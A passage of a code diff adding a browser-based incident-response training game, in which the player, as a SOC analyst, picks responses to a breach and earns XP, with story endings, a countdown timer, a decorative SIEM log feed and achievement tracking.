+[23:51:06] ✓ Evidence preserved
+[23:51:07] ✓ Timeline documented
+[23:51:08] ✓ Threat contained
+[23:51:09] ✓ Systems isolated
+[23:51:10]
+[23:51:15] The incident response team arrives and takes over.
+[23:51:16] Your initial response was textbook perfect.`,
+                choices: [
+                    { text: '[1] Complete incident report', next: 'ending_contained', threat: -15 }
+                ],
+                timed: false
+            },
+
+            external_ir: {
+                text: `[23:52:00] ENGAGING EXTERNAL INCIDENT RESPONSE FIRM...
+[23:52:01]
+[23:52:05] Smart call. This breach requires expert analysis.
+[23:52:06]
+[23:52:10] The IR firm provides:
+[23:52:11] ✓ 24/7 forensic support
+[23:52:12] ✓ Threat intelligence analysis
+[23:52:13] ✓ Legal and regulatory guidance
+[23:52:14] ✓ Breach notification support
+[23:52:15]
+[23:52:20] Your quick escalation minimizes damage and ensures
+[23:52:21] the company has expert support through the crisis.`,
+                choices: [
+                    { text: '[1] Work with IR team on remediation', next: 'ending_professional', threat: -20 }
+                ],
+                timed: false
+            },
+
+            ending_professional: {
+                text: `
+[04:45:12] ═══════════════════════════════════════════
+[04:45:13] INCIDENT RESPONSE COMPLETE
+[04:45:14] ═══════════════════════════════════════════
+[04:45:15]
+[04:45:16] FINAL INCIDENT REPORT
+[04:45:17] ----------------------
+[04:45:18]
+[04:45:19] DETECTION TIME: 23:48:01
+[04:45:20] CONTAINMENT TIME: 23:50:17
+[04:45:21] FULL REMEDIATION: 04:45:12
+[04:45:22]
+[04:45:23] IMPACT ASSESSMENT:
+[04:45:24] ✓ Rapid detection and containment
+[04:45:25] ✓ Lateral movement prevented
+[04:45:26] ✓ Comprehensive forensic evidence collected
+[04:45:27] ✓ Expert IR firm engaged immediately
+[04:45:28] ✓ All attacker persistence mechanisms removed
+[04:45:29] ✓ Systems hardened against re-compromise
+[04:45:30] ✗ Limited data exfiltration occurred (460 MB)
+[04:45:31]
+[04:45:32] BUSINESS OUTCOME:
+[04:45:33] • Breach contained to single web server
+[04:45:34] • Evidence preserved for law enforcement
+[04:45:35] • Regulatory notifications handled professionally
+[04:45:36] • Customer trust maintained through transparency
+[04:45:37] • SOC team commended for exemplary response
+[04:45:38]
+[04:45:39] ═══════════════════════════════════════════
+[04:45:40] ENDING: EXEMPLARY RESPONSE
+[04:45:41] ═══════════════════════════════════════════
+[04:45:42]
+[04:45:43] Your decisive actions and professional judgment during
+[04:45:44] the crisis prevented a catastrophic breach. The company
+[04:45:45] suffers minimal damage and emerges stronger.
+[04:45:46]
+[04:45:47] Three months later, you're promoted to Senior SOC Analyst.
+[04:45:48] The CEO personally thanks you in the quarterly meeting.
+[04:45:49]
+[04:45:50] This is what incident response excellence looks like.
+[04:45:51]
+[04:45:52] THREAT LEVEL: 15% (Fully Mitigated)
+[04:45:53]
+[04:45:54] ✓✓ ACHIEVEMENT UNLOCKED: Master Incident Responder
+[04:45:55] ✓✓ XP AWARDED: +50
+
+[GAME OVER - Press R to restart]`,
+                choices: [],
+                ending: true,
+                endingType: 'perfect'
+            }
+        };
+
+        // ========================
+        // UI Functions
+        // ========================
+        const output = document.getElementById('output');
+        const terminal = document.getElementById('terminal');
+        const alertFlash = document.getElementById('alertFlash');
+        const threatLevel = document.getElementById('threatLevel');
+        const threatFill = document.getElementById('threatFill');
+        const timer = document.getElementById('timer');
+        const timerValue = document.getElementById('timerValue');
+
+        function flashAlert() {
+            alertFlash.classList.add('active');
+            playAlertKlaxon();
+            setTimeout(() => alertFlash.classList.remove('active'), 500);
+        }
+
+        function updateThreatLevel(change) {
+            gameState.threatLevel = Math.max(0, Math.min(100, gameState.threatLevel + change));
+            threatLevel.textContent = gameState.threatLevel;
+            threatFill.style.width = gameState.threatLevel + '%';
+
+            if (change > 0) {
+                flashAlert();
+            }
+        }
+
+        function typeText(text, className = '', speed = 20) {
+            return new Promise((resolve) => {
+                const line = document.createElement('div');
+                line.className = `text-line ${className}`;
+                output.appendChild(line);
+
+                let i = 0;
+                const typeInterval = setInterval(() => {
+                    if (i < text.length) {
+                        line.textContent += text[i];
+                        if (Math.random() > 0.7) playTypewriterClick();
+                        i++;
+                    } else {
+                        clearInterval(typeInterval);
+                        resolve();
+                    }
+                }, speed);
+
+                terminal.scrollTop = terminal.scrollHeight;
+            });
+        }
+
+        function addText(text, className = '') {
+            const line = document.createElement('div');
+            line.className = `text-line ${className}`;
+            line.textContent = text;
+            output.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function clearChoices() {
+            const existingChoices = document.querySelector('.choices');
+            if (existingChoices) {
+                existingChoices.remove();
+            }
+        }
+
+        function showChoices(choices) {
+            clearChoices();
+            const choicesDiv = document.createElement('div');
+            choicesDiv.className = 'choices';
+
+            choices.forEach((choice, index) => {
+                const button = document.createElement('button');
+                button.className = 'choice-btn';
+                button.textContent = choice.text;
+                button.onclick = () => makeChoice(choice);
+                choicesDiv.appendChild(button);
+            });
+
+            output.appendChild(choicesDiv);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function startTimer(duration) {
+            stopTimer();
+            gameState.timerActive = true;
+            gameState.timerValue = duration;
+            timer.classList.add('active');
+            timerValue.textContent = duration;
+
+            // Start heartbeat sound
+            gameState.heartbeatInterval = setInterval(() => {
+                const bpm = 80 + (duration - gameState.timerValue) * 3;
+                playHeartbeat(bpm);
+            }, 60000 / (80 + (duration - gameState.timerValue) * 3));
+
+            gameState.timerInterval = setInterval(() => {
+                gameState.timerValue--;
+                timerValue.textContent = gameState.timerValue;
+
+                if (gameState.timerValue <= 5) {
+                    timer.classList.add('urgent');
+                }
+
+                if (gameState.timerValue <= 0) {
+                    timerExpired();
+                }
+            }, 1000);
+        }
+
+        function stopTimer() {
+            if (gameState.timerInterval) {
+                clearInterval(gameState.timerInterval);
+                gameState.timerInterval = null;
+            }
+            if (gameState.heartbeatInterval) {
+                clearInterval(gameState.heartbeatInterval);
+                gameState.heartbeatInterval = null;
+            }
+            gameState.timerActive = false;
+            timer.classList.remove('active', 'urgent');
+        }
+
+        function timerExpired() {
+            stopTimer();
+            clearChoices();
+            updateThreatLevel(15);
+            setTimeout(async () => {
+                await typeText('[TIMEOUT] You hesitated too long. The attacker exploited the delay.', 'alert-text');
+                await typeText('', '');
+
+                // Force a bad outcome
+                loadNode('monitor_attack');
+            }, 500);
+        }
+
+        // ========================
+        // SIEM Background Animation
+        // ========================
+        const siemBackground = document.getElementById('siemBackground');
+        const siemLogs = [
+            '[INFO] User login: jsmith@internal',
+            '[WARN] Failed authentication attempt',
+            '[INFO] DNS query: api.company.com',
+            '[INFO] HTTP GET /index.html 200',
+            '[ALERT] Port scan detected',
+            '[INFO] Email sent: quarterly_report.pdf',
+            '[WARN] High CPU usage on WEB-02',
+            '[INFO] Backup completed successfully',
+            '[ALERT] Unusual outbound traffic',
+            '[INFO] Database query executed',
+            '[WARN] Expired certificate detected',
+            '[INFO] File uploaded: document.docx'
+        ];
+
+        function updateSIEM() {
+            const log = siemLogs[Math.floor(Math.random() * siemLogs.length)];
+            const timestamp = new Date().toLocaleTimeString();
+            const logLine = document.createElement('div');
+            logLine.className = 'siem-log';
+            logLine.textContent = `[${timestamp}] ${log}`;
+            siemBackground.insertBefore(logLine, siemBackground.firstChild);
+
+            // Keep only last 20 logs
+            while (siemBackground.children.length > 20) {
+                siemBackground.removeChild(siemBackground.lastChild);
+            }
+        }
+
+        setInterval(updateSIEM, 2000);
+
+        // ========================
+        // Game Logic
+        // ========================
+        async function loadNode(nodeId) {
+            const node = storyNodes[nodeId];
+            if (!node) {
+                console.error('Node not found:', nodeId);
+                return;
+            }
+
+            gameState.currentNode = nodeId;
+
+            await typeText('', '');
+            await typeText(node.text, '');
+            await typeText('', '');
+
+            if (node.ending) {
+                handleEnding(node.endingType);
+                return;
+            }
+
+            if (node.timed && node.timerDuration) {
+                startTimer(node.timerDuration);
+            } else {
+                stopTimer();
+            }
+
+            showChoices(node.choices);
+        }
+
+        function makeChoice(choice) {
+            stopTimer();
+            clearChoices();
+
+            if (choice.threat) {
+                updateThreatLevel(choice.threat);
+            }
+
+            setTimeout(() => {
+                loadNode(choice.next);
+            }, 500);
+        }
+
+        function handleEnding(endingType) {
+            stopTimer();
+            stopAmbientDrone();
+
+            if (endingType === 'perfect' || endingType === 'partial') {
+                playSuccessFanfare();
+                awardXP();
+            }
+
+            setTimeout(() => {
+                addText('', '');
+                const restartText = document.createElement('div');
+                restartText.className = 'text-line warning-text';
+                restartText.innerHTML = 'Press <strong>R</strong> to restart or <strong>ESC</strong> to return to Shield House';
+                output.appendChild(restartText);
+            }, 2000);
+        }
+
+        function awardXP() {
+            if (localStorage.getItem('game_incident_xp_awarded')) return;
+            localStorage.setItem('game_incident_xp_awarded', 'true');
+            let xp = parseInt(localStorage.getItem('hexworth_xp') || '0');
+            xp += 50;
+            localStorage.setItem('hexworth_xp', xp.toString());
+            if (window.FirestoreManager) {
+                const uid = localStorage.getItem('hexworth_uid');
+                if (uid) FirestoreManager.addXP(uid, 50, '--incident');
+            }
+            if (window.AchievementManager) AchievementManager.unlock('game_incident');
+        }
+
+        function restartGame() {
+            output.innerHTML = '';
+            gameState = {
+                threatLevel: 25,
+                currentNode: 'start',
+                choices: [],
+                timerActive: false,
+                timerValue: 20,
+                timerInterval: null,
+                heartbeatInterval: null,
+                evidencePreserved: false,
+                lateralMovementStopped: false,
+                dataExfiltrated: false,
+                csuiteCalm: false
+            };
+            updateThreatLevel(0);
+            stopAmbientDrone();
+            startAmbientDrone();
+            loadNode('start');
+        }
+
+        // ========================
+        // Keyboard Controls
+        // ========================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'r' || e.key === 'R') {
+                const node = storyNodes[gameState.currentNode];
+                if (node && node.ending) {
+                    restartGame();
+                }
+            }
+
+            if (e.key === 'Escape') {
+                const node = storyNodes[gameState.currentNode];
+                if (node && node.ending) {
+                    history.back();
+                }
+            }
+
+            // Number key shortcuts for choices
+            if (e.key >= '1' && e.key <= '9') {
+                const choiceButtons = document.querySelectorAll('.choice-btn');
+                const index = parseInt(e.key) - 1;
+                if (choiceButtons[index] && !choiceButtons[index].disabled) {
+                    choiceButtons[index].click();
+                }
+            }
+        });
+
+        // ========================
+        // Initialize Game
+        // ========================
+        window.addEventListener('load', () => {
+            // Resume AudioContext on user interaction
+            document.addEventListener('click', () => {
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume();
+                }
+            }, { once: true });
+
+            setTimeout(() => {
+                startAmbientDrone();
+                loadNode('start');
+            }, 500);
+        });
+    </script>
+
+    <script src="../../../components/FluxCapacitor.js"></script>
+    <script src="../../../components/AchievementManager.js"></script>
+</body>
+</html>
